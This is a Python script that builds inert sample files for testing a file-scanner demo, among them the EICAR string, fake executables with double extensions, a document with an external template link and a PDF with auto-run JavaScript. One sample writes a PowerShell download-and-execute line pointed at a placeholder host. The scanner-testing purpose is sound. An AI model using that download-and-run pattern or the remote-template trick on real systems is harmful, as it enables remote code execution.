#!/usr/bin/env python3
"""Creates HARMLESS sample files for practising the File scanner demo.

None of these files contain working malware: they only carry the markers the scanner
looks for (file headers, macro project names, PDF keywords, the EICAR test string...).
Copy the output folder to the phone's Download folder (or pick it in the app).

    python3 tools/make_test_samples.py  ->  ./scanner_samples/
"""
import os, zipfile

out = "scanner_samples"
os.makedirs(out, exist_ok=True)
p = lambda n: os.path.join(out, n)

# EICAR standard antivirus test file (built from parts)
eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD" + "-ANTIVIRUS-TEST-FILE!$H+H*"
open(p("eicar.com"), "w").write(eicar)
with zipfile.ZipFile(p("eicar_in_zip.zip"), "w") as z:
    z.writestr("eicar.com", eicar)

mz = b"MZ\x90\x00" + b"\x00" * 60 + b"This program cannot be run in DOS mode"   # header only, does nothing
open(p("invoice.pdf.exe"), "wb").write(mz)
open(p("bank_statement.pdf"), "wb").write(mz)            # .pdf name, .exe content

ct = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>'
with zipfile.ZipFile(p("salary_sheet.xlsm"), "w") as z:
    z.writestr("[Content_Types].xml", ct); z.writestr("xl/workbook.xml", "<workbook/>")
    z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0 not real vba")
with zipfile.ZipFile(p("offer_letter.docx"), "w") as z:
    z.writestr("[Content_Types].xml", ct); z.writestr("word/document.xml", "<w:document/>")
    z.writestr("word/_rels/settings.xml.rels",
               '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
               'Target="http://203.0.113.5/t.dotm" TargetMode="External"/></Relationships>')
open(p("ticket.pdf"), "wb").write(b"%PDF-1.4\n1 0 obj<</OpenAction 2 0 R>>endobj\n2 0 obj<</S/JavaScript/JS(app.alert('test'))>>endobj\n%%EOF")
open(p("update.ps1"), "w").write("# test only\n$u='http://example.invalid/a'; IEX (New-Object Net.WebClient).DownloadString($u)\n")
with zipfile.ZipFile(p("photos.zip"), "w") as z:
    z.writestr("holiday.jpg", b"\xff\xd8\xff\xe0JFIF"); z.writestr("Photo_2026.jpg.scr", mz)
open(p("clean_notes.txt"), "w").write("Nothing to see here.\n")
print("Created", len(os.listdir(out)), "harmless samples in", out)
